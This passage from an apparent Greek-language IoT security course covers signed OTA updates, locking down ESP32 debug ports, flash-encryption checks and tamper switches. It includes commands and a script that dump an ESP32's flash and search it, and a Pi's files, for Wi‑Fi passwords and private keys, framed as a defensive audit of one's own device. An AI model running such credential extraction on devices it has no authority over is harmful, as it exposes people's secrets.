            '- `setCACert(CA_CERT)`: το firmware κατεβαίνει μόνο από server με πιστοποιητικό της δικής σου CA.',
            '- `httpUpdate.update(client, url, version)`: γράφει το νέο image στο **ανενεργό** OTA partition και, αν όλα πάνε καλά, το κάνει ενεργό.',
            '- Το Update library ελέγχει το μέγεθος και το **SHA-256 digest** του image. Αυτό εντοπίζει αλλοίωση κατά τη μεταφορά, **όχι** ποιος έφτιαξε το αρχείο. Γι’ αυτό χρειαζόμαστε και υπογραφή (παρακάτω).'
          )),
          code('python', 'ota_server.py: μικρός HTTPS server στο Pi για τα .bin', R`
#!/usr/bin/env python3
"""HTTPS server για OTA. Σερβίρει μόνο αρχεία από /srv/ota."""
import functools
import http.server
import ssl

ROOT = "/srv/ota"
ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
ctx.minimum_version = ssl.TLSVersion.TLSv1_2
ctx.load_cert_chain("/etc/mosquitto/certs/server.crt", "/etc/ota/server.key")

Handler = functools.partial(http.server.SimpleHTTPRequestHandler, directory=ROOT)
httpd = http.server.ThreadingHTTPServer(("0.0.0.0", 8443), Handler)
httpd.socket = ctx.wrap_socket(httpd.socket, server_side=True)
print("OTA server στο https://0.0.0.0:8443/ από", ROOT)
httpd.serve_forever()
`, L(
            '- `PROTOCOL_TLS_SERVER` + `minimum_version`: μόνο TLS 1.2+.',
            '- Το ίδιο `server.crt` του broker (το SAN καλύπτει το `pi-broker.local`). Το κλειδί σε αρχείο που διαβάζει **μόνο** ο χρήστης της υπηρεσίας.',
            '- `directory=ROOT`: δεν σερβίρει τίποτα έξω από το `/srv/ota`.',
            '- Άνοιξε τη θύρα στο ufw **μόνο** για το IoT υποδίκτυο: `sudo ufw allow from 192.168.30.0/24 to any port 8443 proto tcp`.',
            '- Αυτός ο server δεν απαντά 304 στο version header· για απλό «check» μπορείς να έχεις ένα `/fw/sensor01.version` αρχείο.'
          )),
          text(
            '### Επίπεδο 3 και 4: υπογραφή και rollback με ESP-IDF',
            'Στο ESP-IDF, αν έχεις Secure Boot v2, κάθε OTA image **ελέγχεται αυτόματα** πριν γίνει ενεργό. Αν δεν θέλεις (ακόμα) Secure Boot, μπορείς να ζητήσεις μόνο **έλεγχο υπογραφής στα updates**: `CONFIG_SECURE_SIGNED_APPS_NO_SECURE_BOOT=y` και `CONFIG_SECURE_SIGNED_ON_UPDATE_NO_SECURE_BOOT=y`.'
          ),
          code('cpp', 'main/ota.c: HTTPS OTA με esp_https_ota και rollback (ESP-IDF v5)', R`
#include "esp_log.h"
#include "esp_ota_ops.h"
#include "esp_https_ota.h"
#include "esp_http_client.h"
#include "esp_system.h"

static const char *TAG = "ota";

// Ενσωματωμένο με EMBED_TXTFILES ca_cert.pem στο CMakeLists.txt
extern const char ca_cert_pem_start[] asm("_binary_ca_cert_pem_start");

esp_err_t do_ota(const char *url)
{
    esp_http_client_config_t http_cfg = {
        .url = url,
        .cert_pem = ca_cert_pem_start,      // ✅ CA pinning
        .timeout_ms = 15000,
        .keep_alive_enable = true,
    };
    esp_https_ota_config_t ota_cfg = {
        .http_config = &http_cfg,
    };
    ESP_LOGI(TAG, "Λήψη από %s", url);
    esp_err_t err = esp_https_ota(&ota_cfg);   // κατέβασμα + έλεγχος + set boot partition
    if (err == ESP_OK) {
        ESP_LOGI(TAG, "OK, επανεκκίνηση");
        esp_restart();
    }
    ESP_LOGE(TAG, "OTA απέτυχε: %s", esp_err_to_name(err));
    return err;
}

// Καλείται νωρίς στο app_main(): επιβεβαιώνει ότι το νέο firmware δουλεύει
void ota_confirm_or_rollback(bool self_test_ok)
{
    const esp_partition_t *running = esp_ota_get_running_partition();
    esp_ota_img_states_t state;
    if (esp_ota_get_state_partition(running, &state) == ESP_OK &&
        state == ESP_OTA_IMG_PENDING_VERIFY) {
        if (self_test_ok) {
            ESP_LOGI(TAG, "Νέο firmware OK, ακύρωση rollback");
            esp_ota_mark_app_valid_cancel_rollback();
        } else {
            ESP_LOGE(TAG, "Self-test απέτυχε, επιστροφή στο προηγούμενο");
            esp_ota_mark_app_invalid_rollback_and_reboot();
        }
    }
}
`, L(
            '- `extern … asm("_binary_ca_cert_pem_start")`: το ESP-IDF ενσωματώνει το αρχείο `ca_cert.pem` στο binary και δίνει αυτό το σύμβολο. Στο `main/CMakeLists.txt`: `idf_component_register(SRCS "main.c" "ota.c" INCLUDE_DIRS "." EMBED_TXTFILES ca_cert.pem)`.',
            '- `.cert_pem`: ο HTTP client δέχεται μόνο server με αυτή τη CA.',
            '- `esp_https_ota()`: κατεβάζει, γράφει στο επόμενο OTA partition, **επαληθεύει** το image (και την υπογραφή αν είναι ενεργή) και το ορίζει για boot.',
            '- **Rollback** (`CONFIG_BOOTLOADER_APP_ROLLBACK_ENABLE=y`): το νέο firmware ξεκινά σε κατάσταση `PENDING_VERIFY`. Αν δεν καλέσει `esp_ota_mark_app_valid_cancel_rollback()` (π.χ. κράσαρε πριν), στο επόμενο reset ο bootloader γυρίζει στο παλιό.',
            '- Ένα καλό self-test: «συνδέθηκα σε Wi‑Fi **και** στον MQTT broker μέσα σε 60s».',
            '- **Anti-rollback** (`CONFIG_BOOTLOADER_APP_ANTI_ROLLBACK=y`): κάθε image έχει `secure_version`. Ο bootloader αρνείται image με μικρότερο αριθμό από αυτόν που έχει καεί στα eFuses, άρα κανείς δεν σε «γυρίζει» σε παλιά ευάλωτη έκδοση.'
          )),
          code('bash', 'Χειροκίνητη υπογραφή ενός app image', R`
# Αν ΔΕΝ έχεις CONFIG_SECURE_BOOT_BUILD_SIGNED_BINARIES, υπογράφεις μόνος σου:
espsecure.py sign_data --version 2 --keyfile secure_boot_signing_key.pem \
  --output build/my_sensor-signed.bin build/my_sensor.bin

espsecure.py verify_signature --version 2 --keyfile secure_boot_signing_key.pem \
  build/my_sensor-signed.bin

# Ανέβασμα στον OTA server
scp build/my_sensor-signed.bin maria@pi-broker.local:/srv/ota/fw/sensor01.bin
`, L(
            '- `sign_data --version 2`: προσθέτει signature block στο τέλος του image.',
            '- Κράτα τη διαδικασία υπογραφής σε **έναν** υπολογιστή (ή HSM). Ποτέ το κλειδί στον OTA server.'
          )),
          warn('Μην αφήνεις **ποτέ** ArduinoOTA χωρίς κωδικό σε συσκευή που μένει μόνιμα στο δίκτυο. Και ποτέ μη βάζεις τον OTA server ή το signing key σε μηχάνημα προσβάσιμο από το Internet.'),
          quiz('Το HTTPS OTA με `setCACert` και SHA-256 digest **αρκεί** για να είσαι σίγουρος ότι το firmware το έφτιαξες εσύ;',
            ['Ναι, πάντα', 'Όχι: αν παραβιαστεί ο OTA server, ο επιτιθέμενος ανεβάζει δικό του .bin με σωστό digest. Χρειάζεται ψηφιακή υπογραφή με κλειδί που δεν είναι στον server', 'Ναι, αν το .bin είναι μικρό', 'Όχι, γιατί το HTTPS δεν κρυπτογραφεί'], 1,
            'Το TLS προστατεύει τη **μεταφορά**, και το digest την **ακεραιότητα**. Μόνο η **υπογραφή** αποδεικνύει **ποιος** το έφτιαξε.'),
          quiz('Το νέο firmware κρασάρει πριν συνδεθεί στο Wi‑Fi. Με rollback ενεργό, τι γίνεται;',
            ['Η συσκευή μένει «νεκρή»', 'Στο επόμενο reset ο bootloader γυρίζει στο προηγούμενο, λειτουργικό firmware', 'Κατεβάζει μόνη της νέο firmware', 'Σβήνει το flash'], 1,
            'Το image ήταν σε `PENDING_VERIFY` και δεν επιβεβαιώθηκε ποτέ, οπότε ο bootloader το απορρίπτει.'),
          quiz('Τι εμποδίζει το **anti-rollback**;',
            ['Το να κρασάρει το firmware', 'Την εγκατάσταση παλιότερης (ίσως ευάλωτης) υπογεγραμμένης έκδοσης', 'Το OTA γενικά', 'Το Wi‑Fi'], 1,
            'Ένας επιτιθέμενος θα μπορούσε να ανεβάσει μια **παλιά, νόμιμα υπογεγραμμένη** έκδοση με γνωστή ευπάθεια. Ο μετρητής `secure_version` στα eFuses το απαγορεύει.'),
        ],
      },
      {
        id: 'iot-5-4', title: 'JTAG, UART και debug: κλείσε τις πόρτες του developer', minutes: 14,
        goal: 'Να ξέρεις ποιες debug διεπαφές έχει το ESP32 (JTAG, USB-Serial-JTAG, UART download mode, logs) και πώς τις κλείνεις σε συσκευή παραγωγής, με menuconfig και eFuses.',
        blocks: [
          text(
            'Οι διεπαφές debug είναι ευλογία όταν γράφεις κώδικα και κατάρα όταν η συσκευή είναι στον τοίχο:',
            '- **JTAG**: ο debugger σταματά τον επεξεργαστή, διαβάζει/γράφει **μνήμη και registers**. Σε κάποια chips (S3, C3, C6) υπάρχει **USB-Serial-JTAG** στο ίδιο το USB port!',
            '- **UART download mode** (ROM): με GPIO0 στο LOW, το `esptool` διαβάζει και γράφει όλο το flash.',
            '- **Serial logs**: `ESP_LOGI`, `Serial.print`. Συχνά τυπώνουν IP, topics, μέχρι και κωδικούς.'
          ),
          table(['Διεπαφή', 'Πώς κλείνει', 'Αυτόματα με…'], [
            ['JTAG (pins)', 'eFuse `JTAG_DISABLE` (ESP32) / `DIS_PAD_JTAG` (S2/S3/C3…)', 'Secure Boot v2 ή Flash Encryption σε Release mode'],
            ['USB-Serial-JTAG', 'eFuse `DIS_USB_JTAG` (S3/C3/C6…)', 'Release mode (όχι πάντα όλα· έλεγξε το summary)'],
            ['UART download', 'menuconfig: *UART ROM download mode* → Secure mode ή Permanently disabled', '—'],
            ['ROM BASIC console (ESP32)', 'eFuse `CONSOLE_DEBUG_DISABLE`', 'Secure Boot'],
            ['Logs', '`CONFIG_LOG_DEFAULT_LEVEL_WARN` / Core Debug Level: None', '—'],
          ]),
          EFUSE_WARN,
          code('bash', 'Έλεγχος και κάψιμο eFuses για debug (ΜΗ ΑΝΑΣΤΡΕΨΙΜΟ)', R`
# 1) Πρώτα ΠΑΝΤΑ: τι ισχύει ήδη;
espefuse.py -p /dev/ttyUSB0 summary | grep -Ei 'jtag|download|console'

# 2a) Κλασικό ESP32: κλείσιμο JTAG
espefuse.py -p /dev/ttyUSB0 burn_efuse JTAG_DISABLE 1

# 2b) ESP32-S3 / C3: JTAG από pins και από USB
espefuse.py -p /dev/ttyUSB0 burn_efuse DIS_PAD_JTAG 1
espefuse.py -p /dev/ttyUSB0 burn_efuse DIS_USB_JTAG 1

# 3) Secure Download Mode (S2/S3/C3…): το ROM δέχεται μόνο βασικές εντολές
#    (όχι read_flash, όχι ανάγνωση μνήμης). Το esptool σού ζητά επιβεβαίωση "BURN".
espefuse.py -p /dev/ttyUSB0 burn_efuse ENABLE_SECURITY_DOWNLOAD 1
`, L(
            '- Το `espefuse.py` πάντα ζητά να γράψεις `BURN` πριν κάψει κάτι. Διάβασε **δύο φορές** τι γράφει.',
            '- Μετά το `DIS_USB_JTAG` στα S3/C3, το USB port συνεχίζει να δουλεύει ως serial (για logs), αλλά όχι ως JTAG.',
            '- Με **Secure Download Mode**, το `esptool read_flash` αποτυγχάνει. Μπορείς ακόμα να γράψεις (κρυπτογραφημένο) firmware αν το επιτρέπει το mode σου.',
            '- Για το κλασικό ESP32 (v3+), το αντίστοιχο είναι `UART_DOWNLOAD_DIS`, που **κλείνει εντελώς** το download mode (καμία ανάκτηση από USB μετά!).'
          )),
          code('text', 'sdkconfig.defaults για παραγωγή', R`
# Λιγότερα logs: μόνο προειδοποιήσεις και σφάλματα
CONFIG_LOG_DEFAULT_LEVEL_WARN=y
CONFIG_BOOTLOADER_LOG_LEVEL_WARN=y

# UART ROM download mode: μόνιμα σε Secure mode
# (Security features → UART ROM download mode· εμφανίζεται όταν έχεις Secure Boot ή Flash Encryption)
CONFIG_SECURE_ENABLE_SECURE_ROM_DL_MODE=y

# Panic: reboot αντί για GDB stub που περιμένει debugger
CONFIG_ESP_SYSTEM_PANIC_PRINT_REBOOT=y
`, L(
            '- `LOG_DEFAULT_LEVEL_WARN`: τα `ESP_LOGI`/`ESP_LOGD` δεν μπαίνουν καν στο binary.',
            '- `SECURE_ENABLE_SECURE_ROM_DL_MODE`: ο bootloader καίει το αντίστοιχο eFuse στην εκκίνηση (σε chips που το υποστηρίζουν).',
            '- `PANIC_PRINT_REBOOT`: σε crash, τυπώνει backtrace και κάνει reboot. Το `GDBSTUB` αφήνει «πόρτα» για debugger.'
          )),
          code('cpp', 'Arduino: debug μόνο σε debug builds', R`
// Βάλε #define DEBUG_BUILD μόνο όταν δοκιμάζεις (ή -DDEBUG_BUILD στο PlatformIO)
#ifdef DEBUG_BUILD
  #define DBG(...) Serial.printf(__VA_ARGS__)
#else
  #define DBG(...) do {} while (0)
#endif

#include "esp_log.h"

void setup() {
  Serial.begin(115200);
  esp_log_level_set("*", ESP_LOG_WARN);        // λιγότερο «φλύαρες» βιβλιοθήκες
  DBG("[dbg] heap=%u\n", ESP.getFreeHeap());   // εξαφανίζεται σε release
  // Ποτέ, ούτε σε debug: DBG("pass=%s", WIFI_PASS);
}

void loop() {}
`, L(
            '- Η μακροεντολή `DBG` γίνεται **κενή** σε release build: δεν μένουν strings στο binary.',
            '- `esp_log_level_set("*", ESP_LOG_WARN)`: για τα logs των βιβλιοθηκών του core. Στο Arduino IDE ρύθμισε και *Tools → Core Debug Level → None*.',
            '- `do {} while (0)`: κλασικό κόλπο για να συμπεριφέρεται η μακροεντολή σαν κανονική εντολή μέσα σε `if/else`.'
          )),
          tip('Στο PCB: **μην** βάζεις header για UART/JTAG στη συσκευή παραγωγής, ή άφησέ τα ως test pads κάτω από την πλακέτα. Δεν είναι ασφάλεια από μόνο του, αλλά ανεβάζει το κόστος για τον επιτιθέμενο.'),
          quiz('Σε ESP32-S3, έκαψες `DIS_PAD_JTAG` αλλά ο επιτιθέμενος συνδέει debugger μέσω του USB port. Τι ξέχασες;',
            ['Το `JTAG_DISABLE`', 'Το `DIS_USB_JTAG`: το USB-Serial-JTAG είναι ξεχωριστή διαδρομή', 'Το Wi‑Fi', 'Τίποτα, δεν γίνεται'], 1,
            'Στα S3/C3/C6 το USB περιφερειακό έχει ενσωματωμένο JTAG. Χρειάζεται ξεχωριστό eFuse.'),
          quiz('Γιατί οι πληροφοριακές γραμμές log (π.χ. IP, topics) είναι πρόβλημα σε παραγωγή;',
            ['Καθυστερούν πολύ', 'Δίνουν πληροφορίες σε όποιον συνδέσει UART, και συχνά από λάθος περιέχουν μυστικά', 'Γεμίζουν το flash', 'Δεν είναι πρόβλημα'], 1,
            'Κάθε log είναι πιθανή διαρροή. Σε release: μόνο WARN/ERROR, και ποτέ μυστικά σε κανένα επίπεδο.'),
        ],
      },
    ],
  });

  // ====================================================================
  // MODULE 6 — Hardware και φυσικές επιθέσεις (αμυντική ματιά)
  // ====================================================================
  M.push({
    id: 'iot-6', order: 6, title: 'Hardware και φυσικές επιθέσεις (αμυντική ματιά)',
    desc: 'Τι μπορεί να κάνει κάποιος που κρατάει τη συσκευή: UART, JTAG, dump του SPI flash. Γιατί μετράει το flash encryption και πώς φτιάχνεις tamper detection.',
    lessons: [
      {
        id: 'iot-6-1', title: 'UART, JTAG και SPI flash: διάβασε το δικό σου ESP32', minutes: 18,
        goal: 'Να κάνεις **dump** του flash του **δικού σου** ESP32 με `esptool`, να βρεις μόνος σου τα μυστικά μέσα (strings, partition table) με Python, και να δεις τη διαφορά με flash encryption.',
        blocks: [
          text(
            'Ο καλύτερος τρόπος να καταλάβεις γιατί χρειάζεται flash encryption είναι να δεις **τι βλέπει** κάποιος χωρίς αυτό. Θα το κάνουμε στο **δικό σου** ESP32, με τα firmware των προηγούμενων μαθημάτων (με κωδικούς στο NVS ή στο `secrets.h`).',
            '',
            'Τρεις δρόμοι προς το flash:',
            '- **UART (ROM download mode)**: GPIO0 LOW στο reset, και το ROM εκτελεί εντολές του `esptool`. Δεν χρειάζεται καν να ανοίξεις τη συσκευή αν έχει USB.',
            '- **JTAG**: σταματάς τη CPU και διαβάζεις μνήμη/flash με OpenOCD.',
            '- **Απευθείας στο SPI flash chip**: σε πλακέτες με ξεχωριστό flash chip (8 pins), ένα clip και ένας φτηνός programmer το διαβάζουν **χωρίς** να ρωτήσουν το ESP32. Γι’ αυτό το secure download mode **μόνο του** δεν αρκεί.'
          ),
          anim('iot-uart-dump', 'Χωρίς flash encryption: κωδικοί σε απλό κείμενο. Με flash encryption: θόρυβος.'),
          code('bash', 'Dump του flash (ΜΟΝΟ σε δική σου συσκευή)', R`
pip install esptool

# Ποιο chip και πόσο flash έχει;
esptool.py -p /dev/ttyUSB0 flash_id
#   Detected flash size: 4MB

# Ανάγνωση ΟΛΟΥ του flash (4MB = 0x400000)
esptool.py -p /dev/ttyUSB0 -b 921600 read_flash 0 0x400000 dump.bin

# Γρήγορη ματιά: αναγνώσιμα strings ≥ 8 χαρακτήρων
strings -n 8 dump.bin | grep -iE 'ssid|pass|mqtt|wifi|BEGIN|\.local' | head -30
`, L(
            '- `flash_id`: δείχνει μέγεθος flash. Σε 8MB/16MB modules άλλαξε το μέγεθος (`0x800000`, `0x1000000`).',
            '- `-b 921600`: γρηγορότερο baud. Αν πάρεις σφάλματα, κατέβασέ το σε `460800`.',
            '- `read_flash 0 0x400000`: από τη διεύθυνση 0, 4MB. (esptool v5: `esptool read-flash 0 ALL dump.bin`.)',
            '- `strings -n 8`: εμφανίζει ακολουθίες εκτυπώσιμων χαρακτήρων. Μέσα θα δεις το SSID, ίσως τον κωδικό, το `MQTT_HOST`, το PEM της CA κ.λπ.'
          )),
          code('python', 'flash_audit.py: partition table και ύποπτα strings', R`
#!/usr/bin/env python3
"""Αμυντικός έλεγχος ενός dump του ΔΙΚΟΥ σου ESP32: τι μυστικά «φαίνονται»;"""
import math
import re
import struct
import sys

data = open(sys.argv[1], "rb").read()
print(f"Μέγεθος dump: {len(data) // 1024} KB")

# --- 1) Partition table στο 0x8000: εγγραφές 32 bytes, magic 0xAA 0x50 ---
print("\n== Partition table ==")
TYPES = {0: "app", 1: "data"}
for off in range(0x8000, 0x8000 + 0xC00, 32):
    entry = data[off:off + 32]
    if entry[:2] != b"\xaa\x50":
        break
    ptype, subtype, start, size = struct.unpack_from("<BBII", entry, 2)
    label = entry[12:28].split(b"\x00")[0].decode(errors="replace")
    flags = struct.unpack_from("<I", entry, 28)[0]
    enc = " [encrypted]" if flags & 1 else ""
    print(f"{label:<10} {TYPES.get(ptype, ptype)!s:<5} sub=0x{subtype:02x} "
          f"@0x{start:06x} {size // 1024:>5} KB{enc}")

if data[0x8000:0x8002] != b"\xaa\x50":
    print("(δεν βρέθηκε magic: πιθανότατα το flash είναι ΚΡΥΠΤΟΓΡΑΦΗΜΕΝΟ ✅)")

# --- 2) Strings και «ύποπτα» μοτίβα ---
PATTERNS = {
    "PEM private key": re.compile(rb"-----BEGIN [A-Z ]*PRIVATE KEY-----"),
    "PEM certificate": re.compile(rb"-----BEGIN CERTIFICATE-----"),
    "mqtt/wifi λέξη":  re.compile(rb"(?i)(ssid|passw|mqtt|token|apikey)"),
}
print("\n== Ευρήματα ==")
for name, rx in PATTERNS.items():
    hits = [m.start() for m in rx.finditer(data)]
    if hits:
        print(f"⚠️  {name}: {len(hits)} φορές (π.χ. στο 0x{hits[0]:06x})")


# --- 3) Strings με υψηλή εντροπία = πιθανοί κωδικοί/κλειδιά ---
def entropy(s: bytes) -> float:
    counts = {b: s.count(b) for b in set(s)}
    return -sum(c / len(s) * math.log2(c / len(s)) for c in counts.values())


print("\n== Strings υψηλής εντροπίας (12-64 χαρακτήρες) ==")
seen = 0
for m in re.finditer(rb"[\x21-\x7e]{12,64}", data):
    s = m.group()
    if entropy(s) > 3.8 and not s.startswith(b"MII"):   # αγνόησε base64 των PEM
        print(f"0x{m.start():06x}: {s.decode()}")
        seen += 1
        if seen >= 15:
            break
`, L(
            '- Τρέξ’ το: `python3 flash_audit.py dump.bin`.',
            '- **Partition table**: στο `0x8000`, εγγραφές 32 bytes που ξεκινούν με `AA 50`. Βλέπεις πού είναι το `nvs` (εκεί ζουν τα `Preferences`) και αν κάποιο έχει σημαία `encrypted`.',
            '- `struct.unpack_from("<BBII", …)`: little-endian: type, subtype, offset, size.',
            '- Αν το flash είναι κρυπτογραφημένο, ούτε το magic `AA 50` δεν φαίνεται: είναι κι αυτό κρυπτογραφημένο.',
            '- **Εντροπία Shannon**: πόσο «τυχαίο» είναι ένα string. Λέξεις όπως `temperature` έχουν χαμηλή, κωδικοί όπως `8f2K-vQ9x-Lm3p` υψηλή.',
            '- Αυτό είναι ακριβώς ό,τι θα έκανε ένας επιτιθέμενος σε 5 λεπτά. Αν το script σου βρίσκει τους κωδικούς σου, το ίδιο θα κάνει και εκείνος.'
          )),
          tip('Το ESP-IDF έχει και εργαλείο για να διαβάζεις το NVS από dump: `nvs_tool.py` (στο `components/nvs_flash/nvs_partition_tool`). Θα δεις κάθε namespace/key του `Preferences` με τις τιμές τους, αν δεν είναι κρυπτογραφημένο.'),
          text(
            '### Τώρα σύγκρινε',
            'Αν έχεις μια πλακέτα «για θυσία» με flash encryption (Εν. 5.2), κάνε το ίδιο dump. Το `strings` δεν βγάζει τίποτα χρήσιμο, το partition table δεν αναγνωρίζεται, και το script δεν βρίσκει PEM ή κωδικούς. Αυτή είναι όλη η διαφορά.'
          ),
          warn('Τα παραπάνω τα κάνεις **μόνο σε συσκευές που σου ανήκουν**. Η ανάγνωση firmware ξένων συσκευών μπορεί να παραβιάζει νόμους (πνευματική ιδιοκτησία, παράνομη πρόσβαση) και άδειες χρήσης.'),
          quiz('Η πλακέτα σου έχει Secure Download Mode αλλά **όχι** flash encryption. Μπορεί κάποιος να διαβάσει τους κωδικούς;',
            ['Όχι, το download mode είναι κλειστό', 'Ναι: με clip απευθείας στο SPI flash chip, το διαβάζει χωρίς να περάσει από το ESP32', 'Μόνο με JTAG', 'Μόνο αν έχει τον κωδικό Wi‑Fi'], 1,
            'Το secure download mode κλείνει μία πόρτα (το ROM). Τα δεδομένα όμως είναι ακόμα σε απλό κείμενο στο chip του flash. Μόνο το **flash encryption** τα προστατεύει.'),
          quiz('Το `flash_audit.py` δεν βρίσκει το magic `AA 50` στο `0x8000`. Τι σημαίνει πιθανότατα;',
            ['Το dump είναι κατεστραμμένο', 'Το flash είναι κρυπτογραφημένο (και ο partition table)', 'Το ESP32 δεν έχει partitions', 'Το dump είναι από ESP8266'], 1,
            'Με flash encryption ενεργό, και ο partition table κρυπτογραφείται. Ένα «σκουπίδι» στο `0x8000` είναι καλό σημάδι.'),
        ],
      },
      {
        id: 'iot-6-2', title: 'Tamper resistance: όταν κάποιος ανοίγει το κουτί', minutes: 15,
        goal: 'Να σχεδιάσεις φυσική προστασία για ESP32 και Raspberry Pi: **tamper switch** που σβήνει μυστικά και στέλνει ειδοποίηση, και τι κάνεις με την κάρτα SD του Pi.',
        blocks: [
          text(
            'Καμία συσκευή δεν είναι «αδύνατο» να παραβιαστεί αν κάποιος την έχει στα χέρια του αρκετό καιρό. Ο στόχος είναι:',
            '1. Να **ανεβάσεις το κόστος** (χρόνο, εργαλεία, γνώσεις).',
            '1. Να **ανιχνεύσεις** την παραβίαση (tamper detection).',
            '1. Να **περιορίσεις τη ζημιά**: τα μυστικά της συσκευής να μην ανοίγουν τίποτα άλλο.'
          ),
          table(['Μέτρο', 'Κόστος', 'Τι πετυχαίνει'], [
            ['Βίδες ασφαλείας (Torx με πείρο)', '€', 'Σταματά τον «περίεργο»'],
            ['Χωρίς UART/JTAG headers, test pads μόνο', '€', 'Χρειάζεται κόλληση'],
            ['Epoxy/potting πάνω στο chip και το flash', '€€', 'Δύσκολη πρόσβαση στο flash chip'],
            ['ESP32 με ενσωματωμένο flash (π.χ. PICO, S3 με in-package flash)', '€€', 'Δεν υπάρχει χωριστό flash chip για clip'],
            ['Tamper switch → σβήσιμο μυστικών + alert', '€', 'Ανίχνευση + περιορισμός ζημιάς'],
            ['Secure Boot + Flash Encryption (Release)', '0 (χρόνος)', 'Η πιο σημαντική άμυνα'],
            ['Μοναδικά credentials ανά συσκευή', '0', 'Κλεμμένη συσκευή ≠ κλεμμένο σπίτι'],
          ]),
          code('cpp', 'tamper.ino: διακόπτης καπακιού που σβήνει μυστικά και ειδοποιεί', R`
#include <Preferences.h>
#include <WiFi.h>
#include <PubSubClient.h>

// Μικροδιακόπτης/reed: ΚΛΕΙΣΤΟ καπάκι = pin στη γείωση (LOW).
// Ανοίγει το καπάκι → ο pull-up το ανεβάζει σε HIGH.
const int TAMPER_PIN = 33;
volatile bool tampered = false;

extern PubSubClient mqtt;          // από το κύριο sketch (Εν. 4.4)

void IRAM_ATTR onTamper() {
  tampered = true;                 // ISR: μόνο σημαία, τίποτα βαρύ
}

void wipeSecrets() {
  Preferences p;
  p.begin("creds", false);
  p.clear();                       // σβήνει όλα τα keys του namespace
  p.end();
}

void tamperSetup() {
  pinMode(TAMPER_PIN, INPUT_PULLUP);
  if (digitalRead(TAMPER_PIN) == HIGH) tampered = true;     // ανοιχτό ήδη στο boot
  attachInterrupt(digitalPinToInterrupt(TAMPER_PIN), onTamper, RISING);
}

void tamperLoop() {
  if (!tampered) return;
  // 1) Ειδοποίηση ΠΡΙΝ σβήσουμε τα credentials
  if (mqtt.connected()) {
    mqtt.publish("home/sensor01/alert", "TAMPER: το καπάκι άνοιξε", false);
    mqtt.loop();
    delay(300);
  }
  // 2) Σβήσιμο μυστικών και επανεκκίνηση σε «άδεια» κατάσταση
  wipeSecrets();
  WiFi.disconnect(true, true);     // και ό,τι έχει κρατήσει ο Wi‑Fi driver
  ESP.restart();
}
`, L(
            '- `INPUT_PULLUP` + διακόπτης στη γείωση: αν κοπεί το καλώδιο του διακόπτη, το pin πάει HIGH, άρα «αποτυγχάνει με ασφάλεια» (fail-secure).',
            '- `IRAM_ATTR`: η ISR μένει στη RAM και τρέχει ακόμα κι όταν γίνεται εγγραφή στο flash.',
            '- Στην ISR μόνο ορίζουμε σημαία. Το MQTT και το NVS **δεν** επιτρέπονται μέσα σε interrupt.',
            '- Έλεγχος και στο **boot**: αν ο επιτιθέμενος άνοιξε το κουτί με τη συσκευή σβηστή.',
            '- `Preferences::clear()`: σβήνει τα keys του namespace. Μετά η συσκευή χρειάζεται νέο provisioning.',
            '- `WiFi.disconnect(true, true)`: αποσύνδεση και διαγραφή των αποθηκευμένων στοιχείων του driver.',
            '- Η ειδοποίηση πηγαίνει **πρώτα**, για να ξέρεις ποια συσκευή να ανακαλέσεις στο Mosquitto (`mosquitto_passwd -D`).'
          )),
          tip('Σε συσκευή με μπαταρία που κοιμάται (deep sleep), χρησιμοποίησε `esp_sleep_enable_ext0_wakeup(GPIO_NUM_33, 1)`: το άνοιγμα του καπακιού **ξυπνάει** το ESP32 για να αντιδράσει.'),
          text(
            '### Raspberry Pi: η κάρτα SD είναι ανοιχτό βιβλίο',
            'Όποιος βγάλει την κάρτα SD και τη βάλει στο laptop του διαβάζει **τα πάντα**: τον κωδικό Wi‑Fi (`/etc/NetworkManager/system-connections/`), τα hashes του Mosquitto, το `server.key`, τα SSH host keys. Τι κάνεις:'
          ),
          code('bash', 'Τι μυστικά υπάρχουν στην κάρτα του Pi;', R`
# Κωδικοί Wi‑Fi (αποθηκευμένοι από το NetworkManager σε απλό κείμενο, root-only)
sudo grep -r '^psk=' /etc/NetworkManager/system-connections/

# Ιδιωτικά κλειδιά στο σύστημα
sudo find / -xdev \( -name '*.key' -o -name '*.pem' -o -name 'id_*' \) \
  -not -path '/proc/*' -not -path '/usr/share/*' 2>/dev/null

# ΤΟ ΠΙΟ ΣΗΜΑΝΤΙΚΟ: το ca.key ΔΕΝ πρέπει να είναι εδώ
sudo find / -xdev -name 'ca.key' 2>/dev/null && echo "⚠️ μετέφερέ το offline!"
`, L(
            '- Τα αρχεία είναι προστατευμένα από **permissions** όσο τρέχει το Linux. Με την κάρτα σε άλλο υπολογιστή, τα permissions δεν σημαίνουν τίποτα.',
            '- `-xdev`: δεν ψάχνει σε άλλα filesystems (π.χ. USB, network).',
            '- Αν βρεις `ca.key` ή `secure_boot_signing_key.pem` στο Pi: **μετέφερέ τα** σε offline μέσο και σβήσ’ τα από εκεί (`shred -u`).'
          )),
          text(
            '**Μέτρα για το Pi:**',
            '- Βάλε το Pi σε **κλειδωμένο** χώρο/κουτί. Μια θήκη με βίδες ασφαλείας κρύβει την κάρτα SD.',
            '- Κράτα στο Pi **μόνο** όσα μυστικά χρειάζεται (server key ναι, CA key **όχι**).',
            '- Τα Pi 4/5 μπορούν να εκκινούν από **USB SSD**, που μπαίνει μέσα στο κουτί.',
            '- Για ευαίσθητα δεδομένα: κρυπτογράφηση partition με **LUKS** (θέλει ξεκλείδωμα σε κάθε boot, άρα δεν ταιριάζει σε όλα τα σενάρια).',
            '- Τα **Compute Module 4/5** και το Pi 5 υποστηρίζουν **signed boot** μέσω EEPROM (προχωρημένο θέμα, με δικά του μη αναστρέψιμα OTP bits).'
          ),
          quiz('Γιατί ο διακόπτης tamper συνδέεται έτσι ώστε το **κλειστό** καπάκι να δίνει LOW;',
            ['Για λιγότερη κατανάλωση μόνο', 'Αν κοπεί το καλώδιο, ο pull-up δίνει HIGH και η συσκευή το βλέπει ως παραβίαση (fail-secure)', 'Γιατί το ESP32 δεν διαβάζει HIGH', 'Δεν έχει σημασία'], 1,
            'Ένας επιτιθέμενος που κόβει το καλώδιο του διακόπτη θα **προκαλούσε** την ανίχνευση, αντί να την παρακάμψει.'),
          quiz('Ποιο αρχείο **δεν** πρέπει να βρίσκεται στο Raspberry Pi που κάνει broker;',
            ['`/etc/mosquitto/certs/server.key`', '`ca.key` της δικής σου CA', '`/etc/mosquitto/passwd`', '`/etc/mosquitto/certs/ca.crt`'], 1,
            'Το `ca.key` υπογράφει πιστοποιητικά που εμπιστεύονται **όλες** οι συσκευές σου. Αν κλαπεί μαζί με το Pi, ο κλέφτης φτιάχνει «νόμιμους» ψεύτικους brokers.'),
